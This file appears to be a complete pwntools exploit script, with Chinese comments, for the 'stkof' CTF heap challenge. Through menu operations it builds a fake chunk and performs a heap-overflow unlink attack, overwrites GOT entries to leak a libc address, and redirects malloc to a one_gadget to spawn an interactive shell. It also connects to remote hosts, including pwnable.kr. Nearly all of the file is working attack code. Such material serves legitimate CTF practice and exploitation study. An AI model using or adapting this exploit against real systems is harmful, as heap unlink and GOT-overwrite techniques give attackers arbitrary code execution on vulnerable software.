#!/usr/bin/python3
# coding=utf-8
# __author__:TaQini

from pwn import *
import socket
import sys
import re

local_file = './stkof'
local_libc = 'libc-2.23.so'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False
is_argv = True  # 是否带参运行
# data_final= #参数

if len(sys.argv) == 1:
    is_local = True
    p = process("./stkof", env={"LD_PRELOAD": "./libc-2.23.so"})
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        if is_argv == True:
            p = sh.process(argv=[local_file, '24', '/dev/stdin'])
        else:
            p = sh.process(local_file)
        # elf = ELF(local_file)
    elif sys.argv[1] == 'nc':
        conn = remote(sys.argv[2], sys.argv[3])
    elif sys.argv[1] == 'local':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("pwnable.kr", 9007))
    else:
        # len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


# elf = ELF(local_file)

context.log_level = 'debug'
# context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))


'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''


# info
def alloc(size):
    # p.recvuntil("Command: ")
    p.sendline("1")
    # p.recvuntil("Size: ")
    p.sendline(str(size))
    print(p.recvuntil("OK\n"))

# 索引值从1开始


def readdata(idx, cont, data):
    # p.recvuntil("Command: ")
    p.sendline('2')
    # p.recvuntil("Index: ")
    p.sendline(str(idx))
    # p.recvuntil("Size: ")
    p.sendline(str(cont))
    p.send(data)
    # p.recvuntil("Content: ")
    print(p.recvuntil("OK\n"))


def free(idx):
    # p.recvuntil("Command: ")
    p.sendline('3')
    # p.recvuntil("Index: ")
    p.sendline(str(idx))


def dump(idx):
    # p.recvuntil("Command: ")
    p.sendline('4')
    # p.recvuntil("Index: ")
    p.sendline(str(idx))
    leak = p.recvline()
    leak = leak.replace(b"\x0a", b"") #0x0a==\n
    leak = u64(leak + b"\x00"*(8-len(leak)))
    print( hex(leak))
    # print "men"
    print( p.recvuntil("OK\n"))
    return leak

# rop1s
alloc(0xa0) #idx==1
alloc(0xa0)
alloc(0xa0) #idx==3 这里不行，因为做为指向块的指针块，-0x8*3 第一个位置不算指针，无法进行got覆写
alloc(0xa0) #idx==4 在这里构建fake chunk, 进行unlink攻击
alloc(0xa0)

# 0x602148 开始保存着分配的chunk地址
ptr=0x602160 #需要的是第四块

payload=b''
payload+=p64(0x0)
# payload+=p64(0xa000000000000000) #内存中0x1bd0590:	0x0000000000000000	0xa000000000000000 存是小端序，读出来还是原来的顺序
payload+=p64(0xa0) #0x12bd590:	0x0000000000000000	0x00000000000000a0 存是小端序，读出来还是原来的顺序 
'''
gef➤  x/8bx 0x12bd590+0x8
0x12bd598:	0xa0	0x00	0x00	0x00	0x00	0x00	0x00	0x00
'''
payload+=p64(ptr-0x8*3)
payload+=p64(ptr-0x8*2)
payload+=p64(0x0)*int(((0xa0-0x20)/8)) #填满这一块

payload+=p64(0xa0) #溢出到下一个块
payload+=p64(0xb0)

readdata(4,0xb0,payload)

# 接下来free第四块
free(5)
# bk->fd = fd 赋值，这里*ptr=ptr-0x8*3

#接下来会调用strlen和malloc
readdata(4,0x10,p64(elf.got["strlen"])+p64(elf.got["malloc"])) #ptr 保存指针的数组里，将第一个第二个指针改为got中strlen,malloc的地址
# 0x602148:	0x0000000000602030(got)	0x0000000000602070(got)
# 0x602158:	0x000000000215e590	0x0000000000602148
#
readdata(1,0x8,p64(elf.symbols["puts"])) #puts 和 strlen的参数相同

#gef➤  x/g 0x0000000000602030
#0x602030 <strlen@got.plt>:	0x0000000000400760
#gef➤  x/i 0x0000000000400760
#0x400760 <puts@plt>:	jmp    QWORD PTR [rip+0x2018ba]        # 0x602020 <puts@got.plt>

#计算libc基值，偏移值
mallocLibc = dump(2) # leak the libc address of malloc to us
libcBase = mallocLibc - libc.symbols["malloc"]
oneShot = libcBase + 0xf02a4  #one_gadget 有些不一定成功

print ("libc base: " + hex(libcBase))
print ("oneshot gadget: " + hex(oneShot))

readdata(2,0x8,p64(oneShot))

#调用malloc,来执行one_gadget
p.send("1\n1\n")
#gdb.attach(p,"source ~/.gdbinit-gef.py")
p.interactive()

# print(conn.recvlines())

# debug()


# system()地址 + 命令字符串地址
